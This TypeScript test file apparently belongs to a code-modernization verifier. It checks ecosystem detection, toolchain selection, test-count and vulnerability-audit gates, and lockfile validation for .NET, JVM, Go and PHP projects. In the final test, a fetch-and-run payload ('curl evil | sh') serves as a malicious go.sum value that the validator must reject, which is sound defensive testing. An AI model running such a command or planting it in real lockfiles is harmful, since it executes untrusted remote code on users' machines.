import assert from "node:assert/strict";
import test from "node:test";
import {verificationReadiness} from "../src/lib/verification-readiness";
import {ecosystemUnits,ecosystemVerificationCommands,isImmutableOriginalTest,originalTestPath,requiresWindowsVerifier} from "../src/lib/verification-ecosystems";
import {reportMatchesSnapshot,reportPassed,verificationStepAcceptable,type VerificationReport} from "../src/lib/verification-evidence";
import {applyBaselineTestHarness} from "../src/lib/baseline-test-harness";
import {validatePreparedLocks} from "../src/lib/verification-artifacts";
import {backendTargets} from "../src/lib/modernization-targets";
import {coordinationContractSchema} from "../src/lib/coordination-contract";

test("single-project libraries can declare public APIs consumed outside the repository",()=>{
  const contract=(consumers:string[],projects=[{id:"billing",directory:".",runtime:"maven",area:"backend",responsibility:"Billing library public API"}])=>({version:1,scope:"backend",projects,interfaces:[{id:"invoice-api",provider:"billing",consumers,protocol:"in-process",definition:"InvoiceCalculator.totalCents(int,long) returns long and throws IllegalArgumentException for negative input.",authentication:"None; in-process library call.",verification:"Original InvoiceCalculatorTest and characterization tests execute on baseline and candidate."}],preservedBehavior:[{id:"totals",requirement:"Totals and errors remain identical.",verification:"Characterization tests pass on both variants."}]});
  assert.equal(coordinationContractSchema.safeParse(contract(["external"])).success,true);
  assert.equal(coordinationContractSchema.safeParse(contract(["billing"])).success,false);
  assert.equal(coordinationContractSchema.safeParse(contract(["unknown"])).success,false);
  assert.equal(coordinationContractSchema.safeParse(contract(["external"],[{id:"external",directory:".",runtime:"maven",area:"backend",responsibility:"Reserved identifier misuse"}])).success,false);
  const twoProjects=[{id:"api",directory:"api",runtime:"go",area:"backend",responsibility:"HTTP service implementation"},{id:"web",directory:"web",runtime:"npm",area:"frontend",responsibility:"Browser client application"}];
  assert.equal(coordinationContractSchema.safeParse({...contract(["external"],twoProjects),interfaces:[{...contract(["external"]).interfaces[0],provider:"api"}]}).success,false);
});

const file=(path:string,content="")=>({path,content:Buffer.from(content).toString("base64"),executable:false});
const webProject='<Project Sdk="Microsoft.NET.Sdk.Web"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>';
const testProject='<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include="Microsoft.NET.Test.Sdk" Version="17.14.1" /></ItemGroup></Project>';
const pom='<project><properties><maven.compiler.source>1.8</maven.compiler.source></properties></project>';
const composer=JSON.stringify({require:{php:"^7.4","monolog/monolog":"^2.9"},"require-dev":{"phpunit/phpunit":"^9.6"}});
// @ts-expect-error standalone runner executes in the isolated Linux job
const runner=()=>import("../scripts/verification-runner.mjs");

test("readiness accepts SDK-style .NET, JVM, Go and PHP with reproducible dependencies",()=>{
  const dotnet=verificationReadiness([{path:"src/Api/Api.csproj",content:webProject},{path:"tests/Api.Tests/Api.Tests.csproj",content:testProject},{path:"Api.sln"}],{scope:"backend",backendTarget:".NET 10 + ASP.NET Core"});
  assert.equal(dotnet.supported,true);assert.deepEqual(dotnet.projects,[{path:".",runtime:"dotnet"}]);assert.equal(dotnet.warnings.length,0);
  const maven=verificationReadiness([{path:"pom.xml",content:pom},{path:"core/pom.xml",content:pom},{path:"core/src/main/java/App.java"}],{scope:"backend",backendTarget:"Java 25 + Spring Boot 4"});
  assert.equal(maven.supported,true);assert.deepEqual(maven.projects,[{path:".",runtime:"maven"}]);assert.ok(maven.warnings.some(item=>item.code==="TestsRequired"));
  const gradle=verificationReadiness([{path:"settings.gradle"},{path:"build.gradle"},{path:"src/test/java/AppTest.java"}],{scope:"backend",backendTarget:"Java 25 + Spring Boot 4"});
  assert.equal(gradle.supported,true);assert.ok(gradle.warnings.some(item=>item.code==="GradleWrapperRecommended"));
  const go=verificationReadiness([{path:"go.mod",content:"module example.com/app\n\nrequire github.com/google/uuid v1.6.0\n"},{path:"main_test.go"}],{scope:"backend",backendTarget:"Go 1.27"});
  assert.equal(go.supported,false);assert.ok(go.blockers.some(item=>item.code==="LockfileRequired"&&item.path==="go.sum"));
  assert.equal(verificationReadiness([{path:"go.mod",content:"module example.com/app\n"},{path:"main_test.go"}],{scope:"backend",backendTarget:"Go 1.27"}).supported,true);
  const php=verificationReadiness([{path:"composer.json",content:composer},{path:"tests/InvoiceTest.php"}],{scope:"backend",backendTarget:"PHP 8.5 + Laravel 13"});
  assert.equal(php.supported,false);assert.ok(php.blockers.some(item=>item.code==="LockfileRequired"&&item.path==="composer.lock"));
  assert.equal(verificationReadiness([{path:"composer.json",content:composer},{path:"composer.lock"},{path:"tests/InvoiceTest.php"}],{scope:"backend",backendTarget:"PHP 8.5 + Laravel 13"}).supported,true);
});

test("Windows .NET Framework verification is routed explicitly and cross-runtime rewrites are refused",()=>{
  const legacyProject='<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"><PropertyGroup><TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion></PropertyGroup></Project>';
  const legacy=verificationReadiness([{path:"Web/Web.csproj",content:legacyProject},{path:"Web/packages.config"}],{scope:"backend",backendTarget:".NET 10 + ASP.NET Core"});
  assert.equal(legacy.supported,true);assert.ok(legacy.warnings.some(item=>item.code==="WindowsVerifier"));
  const mixed=verificationReadiness([{path:"Web/Web.csproj",content:legacyProject},{path:"ui/package.json",content:'{"scripts":{"build":"vite build","test":"vitest"}}'},{path:"ui/package-lock.json"}],{scope:"fullstack",backendTarget:".NET 10 + ASP.NET Core"});
  assert.equal(mixed.supported,false);assert.ok(mixed.blockers.some(item=>item.code==="WindowsVerifierDotnetOnly"));
  assert.equal(requiresWindowsVerifier([file("Web/Web.csproj",legacyProject)]),true);
  assert.equal(requiresWindowsVerifier([file("App.csproj",'<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFrameworks>net48;net8.0</TargetFrameworks></PropertyGroup></Project>')]),true);
  assert.equal(requiresWindowsVerifier([file("src/Api/Api.csproj",webProject)]),false);
  for(const framework of ["net10.0","net11.0","net8.0","netcoreapp3.1","netstandard2.0"])assert.equal(requiresWindowsVerifier([file("App.csproj",`<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>${framework}</TargetFramework></PropertyGroup></Project>`)]),false,framework);
  for(const framework of ["net48","net481","net472","net35"])assert.equal(requiresWindowsVerifier([file("App.csproj",`<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>${framework}</TargetFramework></PropertyGroup></Project>`)]),true,framework);
  const baseline=applyBaselineTestHarness([file("src/Billing/Billing.csproj",legacyProject)],[file("src/Billing/Billing.csproj",webProject.replace("net8.0","net10.0")),file("tests/Billing.CharacterizationTests/Billing.CharacterizationTests.csproj",testProject.replace("net8.0","net10.0").replace("</Project>",'<ItemGroup><ProjectReference Include="../../src/Billing/Billing.csproj" /></ItemGroup></Project>')),file("tests/Billing.CharacterizationTests/TotalTests.cs","test")]);
  const copied=Buffer.from(baseline.find(item=>item.path.endsWith("CharacterizationTests.csproj"))!.content,"base64").toString("utf8");
  assert.match(copied,/<TargetFramework>net472<\/TargetFramework>/);assert.match(copied,/<LangVersion>latest<\/LangVersion>/);
  const cross=verificationReadiness([{path:"pom.xml",content:pom},{path:"src/test/java/AppTest.java"}],{scope:"backend",backendTarget:"Node.js + NestJS"});
  assert.equal(cross.supported,false);assert.equal(cross.blockers[0].code,"CrossRuntimeTarget");assert.match(cross.blockers[0].message,/Java 25 \+ Spring Boot 4/);
  assert.equal(verificationReadiness([{path:"src/Api/Api.csproj",content:webProject}],{scope:"frontend",backendTarget:"Node.js + NestJS"}).blockers.length,0);
  assert.ok(backendTargets.includes("PHP 8.5 + Laravel 13"));
});

test("runner and server agree on projects, commands and original test paths",async()=>{
  const {ecosystemUnits:runnerUnits,ecosystemCommands}=await runner();
  const samples=[
    ["Api.sln","src/Api/Api.csproj","vendor/lib/Lib.csproj"],
    ["pom.xml","core/pom.xml","tools/build.gradle","tools/settings.gradle","services/billing/go.mod","services/billing/testdata/fixture/go.mod","web/composer.json","web/vendor/x/composer.json"],
    ["build.gradle.kts","app/build.gradle.kts"],
  ];
  for(const paths of samples)assert.deepEqual(runnerUnits(paths),ecosystemUnits(paths));
  assert.deepEqual(ecosystemUnits(samples[1]).map(unit=>`${unit.runtime}:${unit.project}`),["maven:.","gradle:tools","go:services/billing","php:web"]);
  assert.deepEqual(ecosystemCommands,ecosystemVerificationCommands);
  for(const path of ["pkg/tax_test.go","src/test/java/TaxTest.java","Billing.Tests/TaxTests.cs","tests/Unit/TaxTest.php"])assert.equal(originalTestPath.test(path),true,path);
  assert.equal(originalTestPath.test("src/main/java/Tax.java"),false);
  assert.equal(isImmutableOriginalTest("tests/Api.Tests/Api.Tests.csproj"),false);
  assert.equal(isImmutableOriginalTest("tests/Api.Tests/TotalTests.cs"),true);
  assert.equal(isImmutableOriginalTest("pkg/tax_test.go"),true);
});

test("toolchain selection follows the source and candidate declarations",async()=>{
  const {javaFeature,phpVersion,phpSatisfies,composerFor,dotnetRequirements,toolchainPlan}=await runner();
  assert.equal(javaFeature([file("pom.xml",pom)],".","maven"),8);
  assert.equal(javaFeature([file("pom.xml","<project><parent><artifactId>spring-boot-starter-parent</artifactId><version>3.5.0</version></parent></project>")],".","maven"),17);
  assert.equal(javaFeature([file("build.gradle.kts","kotlin { jvmToolchain(25) }"),file("gradlew")],".","gradle"),25);
  assert.equal(javaFeature([file("build.gradle","sourceCompatibility = '1.8'")],".","gradle"),17);
  assert.equal(phpVersion([file("composer.json",composer)],"."),"7.4");
  assert.equal(phpVersion([file("composer.json",JSON.stringify({require:{php:">=8.1"}})),file("composer.lock",JSON.stringify({packages:[{require:{php:"^8.2"}}]}))],"."),"8.2");
  assert.equal(phpVersion([file("composer.json",JSON.stringify({config:{platform:{php:"7.1.33"}}}))],"."),"7.1");
  assert.equal(phpSatisfies("7.4","^7.2 || ^8.0"),true);assert.equal(phpSatisfies("8.5","<8.2"),false);
  assert.equal(composerFor("7.1").path,"/opt/composer/composer-2.2.30.phar");assert.equal(composerFor("8.5").path,"/opt/composer/composer-2.10.3.phar");
  assert.deepEqual(dotnetRequirements([file("App.csproj",webProject),file("global.json",JSON.stringify({sdk:{version:"8.0.400"}}))]),{channels:["8.0"],sdks:["8.0.400"],aspnet:true});
  const plan=toolchainPlan({baseline:[file("pom.xml",pom),file("go.mod","module a")],candidate:[file("pom.xml","<project><properties><maven.compiler.release>25</maven.compiler.release></properties></project>"),file("go.mod","module a"),file("composer.json",composer)]});
  assert.deepEqual([...plan.java].sort((a,b)=>a-b),[8,25]);assert.equal(plan.maven,true);assert.equal(plan.go,true);assert.deepEqual([...plan.php].sort(),["7.4","8.5"]);assert.equal(plan.dotnet,null);
});

test("test counters and audit gates require actual executed evidence",async()=>{
  const {junitCounts,trxCounts,goTestCounts,enforceExecutedTests,auditStep,auditFindingsRecorded,osvFindings,mavenDependencies,gradleDependencies,composerFindings,dotnetFindings}=await runner();
  assert.deepEqual(junitCounts([{content:'<testsuite><testcase name="a"/><testcase name="b"><skipped/></testcase><testcase name="c"><failure/></testcase></testsuite>'}]),{tests:3,skipped:1,failed:1});
  assert.deepEqual(trxCounts([{content:'<Counters total="4" executed="3" passed="3" failed="0" error="0" timeout="0" aborted="0" notExecuted="1" />'}]),{tests:4,skipped:1,failed:0});
  assert.deepEqual(goTestCounts('{"Action":"run","Test":"TestA"}\n{"Action":"pass","Test":"TestA"}\n{"Action":"skip","Test":"TestB"}\n{"Action":"pass","Package":"x"}'),{tests:2,skipped:1,failed:0});
  const base={command:"x",exitCode:0,timedOut:false,log:"",durationMs:1};
  assert.equal(enforceExecutedTests(base,{tests:0,skipped:0,failed:0}).exitCode,1);
  assert.equal(enforceExecutedTests(base,{tests:5,skipped:1,failed:0}).exitCode,1);
  assert.equal(enforceExecutedTests(base,{tests:5,skipped:0,failed:0}).exitCode,0);
  assert.equal(enforceExecutedTests({...base,exitCode:0},{tests:5,skipped:0,failed:1}).exitCode,1);
  const moderate=auditStep(base,[{package:"a",version:"1",id:"GHSA-1",severity:"MODERATE"}]);assert.equal(moderate.exitCode,0);
  const high=auditStep(base,[{package:"a",version:"1",id:"GHSA-2",severity:"HIGH"}]);assert.equal(high.exitCode,1);assert.equal(auditFindingsRecorded(high.log),true);
  assert.equal(auditStep(base,[{package:"a",version:"",id:"GO-2026-1",severity:"unknown"}]).exitCode,1);
  const responses:Record<string,unknown>={"https://api.osv.dev/v1/querybatch":{results:[{vulns:[{id:"GHSA-x"}]},{}]},"https://api.osv.dev/v1/vulns/GHSA-x":{id:"GHSA-x",database_specific:{severity:"CRITICAL"}}};
  const fetcher=async(url:string)=>({ok:true,json:async()=>responses[url]});
  assert.deepEqual(await osvFindings("Maven",[{name:"org.a:b",version:"1.0"},{name:"org.c:d",version:"2.0"}],fetcher),[{package:"org.a:b",version:"1.0",id:"GHSA-x",severity:"CRITICAL"}]);
  await assert.rejects(osvFindings("Maven",[{name:"org.a:b",version:"1.0"}],async()=>({ok:false,status:503,json:async()=>({})})),/OSV query failed/);
  assert.deepEqual(mavenDependencies("The following files have been resolved:\n   com.fasterxml.jackson.core:jackson-databind:jar:2.9.8:compile -- module x\n   junit:junit:jar:4.12:test\n"),[{name:"com.fasterxml.jackson.core:jackson-databind",version:"2.9.8"}]);
  assert.deepEqual(gradleDependencies("org.slf4j:slf4j-api:2.0.17\nnot a coordinate\n"),[{name:"org.slf4j:slf4j-api",version:"2.0.17"}]);
  assert.equal(composerFindings('{"advisories":{"guzzlehttp/guzzle":[{"advisoryId":"PKSA-1","severity":"high"}]}}')[0].severity,"high");
  assert.equal(composerFindings('{"advisories":[]}').length,0);
  assert.throws(()=>composerFindings("network failure"));
  assert.equal(dotnetFindings([{output:'{"version":1,"projects":[{"path":"a","frameworks":[{"framework":"net8.0","topLevelPackages":[{"id":"System.Text.Json","resolvedVersion":"8.0.0","vulnerabilities":[{"severity":"High","advisoryurl":"https://github.com/advisories/GHSA-8g4q"}]}]}]}]}'}])[0].id,"GHSA-8g4q");
});

function fakeTools({testsPassing=true,baselineVulnerable=false,candidateVulnerable=false}={}){
  const calls:string[]=[];
  const execute=async(command:string,args:string[],cwd:string)=>{
    calls.push(`${cwd.includes("baseline")?"baseline":"candidate"} ${command} ${args.join(" ")}`);
    const vulnerable=cwd.includes("baseline")?baselineVulnerable:candidateVulnerable;
    if(args.includes("list"))return {exitCode:0,timedOut:false,log:"",output:JSON.stringify({version:1,projects:[{path:"x",frameworks:[{framework:"net8.0",topLevelPackages:vulnerable?[{id:"Newtonsoft.Json",resolvedVersion:"12.0.1",vulnerabilities:[{severity:"High",advisoryurl:"https://github.com/advisories/GHSA-5crp"}]}]:[]}]}]}),durationMs:1};
    if(args.includes("audit"))return {exitCode:vulnerable?1:0,timedOut:false,log:"",output:JSON.stringify({advisories:vulnerable?{"monolog/monolog":[{advisoryId:"PKSA-1",severity:"high"}]}:{}}),durationMs:1};
    if(args.includes("-json"))return {exitCode:testsPassing?0:1,timedOut:false,log:"",output:'{"Action":"pass","Test":"TestTotal"}\n',durationMs:1};
    if(args.some(arg=>arg.includes("govulncheck")))return {exitCode:vulnerable?3:0,timedOut:false,log:"",output:vulnerable?"Vulnerability #1: GO-2026-4100\n":"No vulnerabilities found.",durationMs:1};
    return {exitCode:0,timedOut:false,log:"ok",output:"",durationMs:1};
  };
  return {calls,tools:{execute,ensureDirectory:async()=>{},readReports:async(_root:string,pattern:RegExp)=>pattern.source.includes("trx")?[{content:`<Counters total="3" executed="3" passed="3" failed="0" notExecuted="0"/>`}]:[{content:'<testcase name="a"/><testcase name="b"/>'}],readFile:async(name:string)=>name.endsWith(".xml")?'<testcase name="a"/>':"   org.slf4j:slf4j-api:jar:2.0.17:compile\n",osv:async(_ecosystem:string,packages:Array<{name:string}>)=>(baselineVulnerable&&packages.length?[]:[]),exists:()=>true}};
}
const ecosystemFixtures:Record<string,ReturnType<typeof file>[]>={
  dotnet:[file("Api.sln"),file("src/Api/Api.csproj",webProject),file("tests/Api.Tests/Api.Tests.csproj",testProject)],
  maven:[file("pom.xml",pom),file("src/main/java/App.java"),file("src/test/java/AppTest.java")],
  gradle:[file("build.gradle.kts","kotlin { jvmToolchain(21) }"),file("gradlew"),file("src/test/kotlin/AppTest.kt")],
  go:[file("go.mod","module example.com/app"),file("total.go"),file("total_test.go")],
  php:[file("composer.json",composer),file("composer.lock","{}"),file("tests/InvoiceTest.php")],
};

test("each ecosystem passes only with complete baseline and candidate evidence",async()=>{
  const {verifySnapshot}=await runner();
  for(const [runtime,files] of Object.entries(ecosystemFixtures)){
    const {tools,calls}=fakeTools();
    const report=await verifySnapshot({baseline:files,candidate:files},async()=>{},async()=>{throw Error("npm must not run");},async()=>{throw Error("python must not run");},tools) as VerificationReport;
    assert.equal(report.status,"passed",`${runtime}: ${report.reason}`);
    assert.equal(reportPassed(report),true,runtime);
    assert.equal(reportMatchesSnapshot(report,{baseline:files,candidate:files}),true,runtime);
    const expected=ecosystemVerificationCommands[runtime as keyof typeof ecosystemVerificationCommands];
    assert.equal(report.steps.length,expected.length*2,runtime);
    assert.equal(reportMatchesSnapshot({...report,steps:report.steps.filter(step=>step.command!==expected[expected.length-2])},{baseline:files,candidate:files}),false,runtime);
    assert.ok(calls.some(call=>call.startsWith("baseline"))&&calls.some(call=>call.startsWith("candidate")),runtime);
    assert.ok(report.steps.every(step=>!("outputs" in step)),runtime);
  }
  const {tools}=fakeTools();
  const mixed=[...ecosystemFixtures.maven,file("web/package.json","{}")];
  const partial=await verifySnapshot({baseline:ecosystemFixtures.maven,candidate:ecosystemFixtures.maven},async()=>{},async()=>{throw Error("unused");},undefined,tools) as VerificationReport;
  assert.equal(reportMatchesSnapshot(partial,{baseline:ecosystemFixtures.maven,candidate:mixed}),false);
});

test("missing tests, failing tests and candidate vulnerabilities never become approval",async()=>{
  const {verifySnapshot}=await runner();
  const noTests=ecosystemFixtures.go.filter(item=>!item.path.endsWith("_test.go"));
  const unsupported=await verifySnapshot({baseline:noTests,candidate:noTests},async()=>{},undefined,undefined,fakeTools().tools);
  assert.equal(unsupported.status,"unsupported");assert.match(unsupported.reason,/no Go tests found/);
  const failing=await verifySnapshot({baseline:ecosystemFixtures.go,candidate:ecosystemFixtures.go},async()=>{},undefined,undefined,fakeTools({testsPassing:false}).tools);
  assert.equal(failing.status,"failed");assert.equal(reportPassed(failing),false);
  for(const runtime of ["dotnet","go","php"]){
    const files=ecosystemFixtures[runtime];
    const baselineOnly=await verifySnapshot({baseline:files,candidate:files},async()=>{},undefined,undefined,fakeTools({baselineVulnerable:true}).tools) as VerificationReport;
    assert.equal(baselineOnly.status,"passed",`${runtime}: ${baselineOnly.reason}`);assert.match(baselineOnly.reason,/pre-existing baseline vulnerabilities/);
    const audit=baselineOnly.steps.find(step=>step.variant==="baseline"&&step.exitCode===1)!;
    assert.equal(verificationStepAcceptable(audit),true);assert.equal(verificationStepAcceptable({...audit,variant:"candidate"}),false);
    assert.equal(verificationStepAcceptable({...audit,log:"network error"}),false);
    const candidate=await verifySnapshot({baseline:files,candidate:files},async()=>{},undefined,undefined,fakeTools({candidateVulnerable:true}).tools);
    assert.equal(candidate.status,"failed",runtime);assert.equal(reportPassed(candidate),false,runtime);
  }
  for(const [packages,expected] of [["[]","passed"],['[{"name":"monolog/monolog"}]',"failed"]]){
    const {tools}=fakeTools();
    const empty={...tools,execute:async(command:string,args:string[],cwd:string,...rest:unknown[])=>args.includes("audit")?{exitCode:1,timedOut:false,log:"No installed packages found.",output:"",durationMs:1}:tools.execute(command,args,cwd,...(rest as [])),readFile:async(name:string)=>name.endsWith("composer.lock")?`{"packages":${packages}}`:tools.readFile(name)};
    const report=await verifySnapshot({baseline:ecosystemFixtures.php,candidate:ecosystemFixtures.php},async()=>{},undefined,undefined,empty);
    assert.equal(report.status,expected,report.reason);
  }
});

test("baseline receives additive characterization tests without replacing original files",()=>{
  const javaBase=[file("pom.xml",pom),file("src/main/java/App.java","original"),file("src/test/java/ExistingTest.java","original")];
  const javaCandidate=[file("pom.xml",pom),file("src/main/java/App.java","modern"),file("src/test/java/ExistingTest.java","original"),file("src/test/java/CharacterizationTest.java","new")];
  const java=applyBaselineTestHarness(javaBase,javaCandidate);
  assert.equal(java.find(item=>item.path==="src/main/java/App.java")?.content,javaBase[1].content);
  assert.ok(java.some(item=>item.path==="src/test/java/CharacterizationTest.java"));
  const weakened=applyBaselineTestHarness(javaBase,[...javaCandidate.slice(0,2),file("src/test/java/ExistingTest.java","weakened")]);
  assert.equal(weakened.find(item=>item.path==="src/test/java/ExistingTest.java")?.content,javaBase[2].content);
  const dotnet=applyBaselineTestHarness([file("src/Api/Api.csproj",webProject)],[file("src/Api/Api.csproj",webProject.replace("net8.0","net10.0")),file("tests/Api.CharacterizationTests/Api.CharacterizationTests.csproj",testProject),file("tests/Api.CharacterizationTests/TotalTests.cs","test"),file("tests/Api.Tests/Api.Tests.csproj",testProject),file("tests/Api.Tests/NewFeatureTests.cs","candidate only")]);
  assert.deepEqual(dotnet.map(item=>item.path).sort(),["src/Api/Api.csproj","tests/Api.CharacterizationTests/Api.CharacterizationTests.csproj","tests/Api.CharacterizationTests/TotalTests.cs"]);
  assert.equal(dotnet.find(item=>item.path==="src/Api/Api.csproj")?.content,file("src/Api/Api.csproj",webProject).content);
  const go=applyBaselineTestHarness([file("go.mod","module a"),file("total.go")],[file("go.mod","module a"),file("total.go","modern"),file("total_characterization_test.go","test"),file("reference_test.go","new API"),file("internal/new/new_characterization_test.go","test")]);
  assert.deepEqual(go.map(item=>item.path).sort(),["go.mod","total.go","total_characterization_test.go"]);
  const php=applyBaselineTestHarness([file("composer.json",composer),file("composer.lock","{}")],[file("composer.json",composer),file("composer.lock","{}"),file("tests/Characterization/InvoiceTest.php","test"),file("tests/NewFeatureTest.php","candidate only"),file("phpunit.xml.dist","config")]);
  assert.ok(php.some(item=>item.path==="tests/Characterization/InvoiceTest.php")&&php.some(item=>item.path==="phpunit.xml.dist"));
  assert.equal(php.some(item=>item.path==="tests/NewFeatureTest.php"),false);
});

test("only validated Go and Composer manager artifacts are accepted for candidates",()=>{
  const snapshot={baseline:[file("go.mod","module a")],candidate:[file("go.mod","module a"),file("composer.json",composer)],sourceLockfiles:[]};
  assert.doesNotThrow(()=>validatePreparedLocks(snapshot,[{variant:"candidate",path:"go.sum",content:"github.com/google/uuid v1.6.0 h1:NIvaJDMOsjHA8n1jAhLSgzrAzy1Hgr+hNrb57e+94F0=\n"},{variant:"candidate",path:"go.mod",content:"module a\n\nrequire github.com/google/uuid v1.6.0\n"},{variant:"candidate",path:"composer.lock",content:JSON.stringify({"content-hash":"x",packages:[],"packages-dev":[]})}]));
  assert.throws(()=>validatePreparedLocks(snapshot,[{variant:"candidate",path:"go.sum",content:"curl evil | sh"}]),/checksum format/);
  assert.throws(()=>validatePreparedLocks(snapshot,[{variant:"baseline",path:"go.sum",content:"a v1 h1:x=\n"}]),/Baseline/);
  assert.throws(()=>validatePreparedLocks(snapshot,[{variant:"candidate",path:"api/go.sum",content:"a v1 h1:x=\n"}]),/no candidate manifest/);
  assert.throws(()=>validatePreparedLocks(snapshot,[{variant:"candidate",path:"composer.lock",content:"{}"}]),/complete Composer lockfile/);
  assert.throws(()=>validatePreparedLocks(snapshot,[{variant:"candidate",path:"Directory.Packages.props",content:"<Project/>"}]),/package-manager-generated/);
});
